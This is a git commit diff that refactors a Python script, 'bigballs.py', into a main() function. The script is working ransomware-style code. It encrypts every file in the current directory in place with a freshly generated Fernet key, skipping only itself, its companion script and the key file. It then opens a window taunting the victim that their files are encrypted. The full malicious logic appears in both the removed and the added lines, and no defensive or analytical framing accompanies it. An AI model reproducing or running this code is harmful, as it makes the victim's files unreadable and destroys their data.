93c0f043c256741b51fdec75c19ea15d5f4ead72
Eclipse/Alex <90584863+LunarEclipses@users.noreply.github.com>
2022-10-02 20:07:06 -0400

    Update bigballs.py

--- bigballs.py
+++ bigballs.py
@@ -7,30 +7,30 @@ from tkinter import *
 
 
 files = []
-
-for file in os.listdir():
-    if file == "bigballs.py" or file=="thekey.key"or file=="smallballs.py":
-        continue
-    if os.path.isfile(file):
-        files.append(file)
+def main():
+    for file in os.listdir():
+        if file == "bigballs.py" or file=="thekey.key"or file=="smallballs.py":
+            continue
+        if os.path.isfile(file):
+            files.append(file)
         
-key = Fernet.generate_key()
-with open("thekey.key", "wb") as thekey:
-    thekey.write(key)
+    key = Fernet.generate_key()
+    with open("thekey.key", "wb") as thekey:
+        thekey.write(key)
     
-for file in files:
-    with open(file, "rb") as thefile:
-        contents = thefile.read()
-    contents_encrypted = Fernet(key).encrypt(contents)
-    with open(file, "wb") as thefile:
-        thefile.write(contents_encrypted)
-    
-    
-root = Tk()
-root.geometry("512x512")
-T=Text(root, height = 10, width=104)
-l = Label(root, text="all of ur files are encrypted, loser. gl getting them back.")
-l.pack()
-T.pack()
+    for file in files:
+        with open(file, "rb") as thefile:
+            contents = thefile.read()
+        contents_encrypted = Fernet(key).encrypt(contents)
+        with open(file, "wb") as thefile:
+            thefile.write(contents_encrypted)
+    root = Tk()
+    root.geometry("512x512")
+    T=Text(root, height = 10, width=104)
+    l = Label(root, text="all of ur files are encrypted, loser. gl getting them back.")
+    l.pack()
+    T.pack()
+    root.mainloop()
 
-root.mainloop()
+if __name__ == '__main__':
+    main()
